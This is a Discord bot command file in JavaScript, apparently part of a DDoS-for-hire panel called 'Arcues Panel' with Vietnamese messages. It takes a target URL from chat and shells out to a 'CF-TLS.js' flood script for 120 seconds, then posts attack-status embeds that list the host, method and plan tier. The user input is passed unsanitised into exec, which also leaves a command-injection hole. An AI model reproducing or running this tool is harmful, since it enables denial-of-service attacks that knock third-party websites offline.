const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu .CF-TLS https://example.com/`")
	.setFooter("Vui lòng không tấn công các website có domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node CF-TLS.js ${host} 120 10 httpv2.txt`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Cuộc tấn công đã dừng lại ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Arcues Panel** 🚀')
	.setTimestamp()
	.setDescription("**► The attack is over 👾**")
	.setFooter('© Copyright: novadz', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://i.gifer.com/DzUh.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Arcues Panel** 🚀')
	.setTimestamp()
  .setDescription("**👨‍💻User**:\n`[" + message.author.username + "]` \n **🔗Host**:\n`[" + host + "]` \n **💥Method**:\n`[CF-TLS]` \n **🕒Time**:\n`[120]` \n **💸Plan**:\n`[Basic]`")	
  .setFooter('© Copyright: nova', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['CF-TLS'],
  permLevel: 0
}

exports.help = {
  name: 'CF-TLS',
  description: 'Hoan',
  usage: 'CF-TLS'
}